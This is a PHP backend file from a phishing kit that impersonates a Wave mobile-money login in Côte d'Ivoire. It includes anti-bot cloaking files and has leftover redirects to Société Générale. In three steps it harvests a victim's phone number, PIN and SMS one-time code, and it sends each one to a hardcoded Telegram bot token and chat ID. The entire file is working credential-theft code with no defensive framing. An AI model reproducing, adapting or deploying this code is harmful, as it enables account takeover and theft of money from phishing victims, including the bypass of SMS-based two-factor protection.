<?php
session_start();
error_reporting(0);
set_time_limit(0);
session_start();
include ('../../prevents/bots.php');
include ('../../prevents/antimar.php');
include ('../../prevents/banned-ip.php');
	include ('../../prevents/anti1.php');
	include ('../../prevents/anti2.php');
	include ('../../prevents/anti3.php');
	include ('../../prevents/anti4.php');
	include ('../../prevents/anti5.php');
	include ('../../prevents/anti6.php');
	include ('../../prevents/anti7.php');
	include ('../../prevents/anti8.php');

header('Content-type: text/html; charset-UTF-8');
include('./inclu/para.php');
include('./inclu/bots.php');
//include('./inclu/banned-ip.php');
date_default_timezone_set('GMT');
$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
$url = $_SESSION['url'];
$ip = getenv("REMOTE_ADDR");

$idClient = $_POST['user_id'];



if($hhh){
  if($hhh['bloque'] == 1){
    header("Location: https://particuliers.societegenerale.fr/restitution/cns_listeprestation.html");
    exit;
  }
}else{

}

// Remplace ces deux variables par les tiennes
$botToken = "8550681538:AAFeZE-haJ_q8_g9NDic1Z17ciUa4nHBLPE";
$chatId   = "-5028537179";

// Étape actuelle
$step = $_POST['step'] ?? '';

switch ($step) {
  // Étape 1 : Téléphone
  case 'phone':
    $phone = preg_replace('/\D/', '', $_POST['phone'] ?? '');
    if (strlen($phone) === 10) {
      $_SESSION['phone'] = $phone;

      // Message vers Telegram
      $message = "📞 Connexion Wave - Téléphone reçu : +225 $phone";

      $url = "https://api.telegram.org/bot$botToken/sendMessage";
      $data = [
        'chat_id' => $chatId,
        'text'    => $message
      ];
      $context = stream_context_create([
        'http' => [
          'method'  => 'POST',
          'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
          'content' => http_build_query($data)
        ]
      ]);
      file_get_contents($url, false, $context);

      header("Location: ../opt.php");
    } else {
      header("Location: ../index.php");
    }
    exit();

  // Étape 2 : Code PIN
  case 'pin':
    $pin = $_POST['pin'] ?? '';
    if (strlen($pin) === 4 && ctype_digit($pin)) {
      $_SESSION['pin'] = $pin;

      $message = "🔒 Code PIN reçu : $pin";

      $url = "https://api.telegram.org/bot$botToken/sendMessage";
      $data = ['chat_id' => $chatId, 'text' => $message];
      $context = stream_context_create([
        'http' => [
          'method'  => 'POST',
          'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
          'content' => http_build_query($data)
        ]
      ]);
      file_get_contents($url, false, $context);

      header("Location: ../loading.php");
    } else {
      header("Location: ../opt.php");
    }
    exit();

  // Étape 3 : Code SMS
  case 'sms':
    $sms = trim($_POST['sms_code'] ?? '');
    if (strlen($sms) >= 4 && isset($_SESSION['phone'], $_SESSION['pin'])) {
      $phone = $_SESSION['phone'];
      $pin   = $_SESSION['pin'];

      $message = "✅ Connexion Wave terminée\n\n"
               . "📞 Téléphone : +225 $phone\n"
               . "🔒 PIN : $pin\n"
               . "🔑 SMS : $sms";

      $url = "https://api.telegram.org/bot$botToken/sendMessage";
      $data = ['chat_id' => $chatId, 'text' => $message];
      $context = stream_context_create([
        'http' => [
          'method'  => 'POST',
          'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
          'content' => http_build_query($data)
        ]
      ]);
      file_get_contents($url, false, $context);

      session_destroy();
      header("Location: ../merci.php");
    } else {
      header("Location: ../sms.php");
    }
    exit();

  // Aucune étape
  default:
    header("Location: ../index.php");
    exit();
}
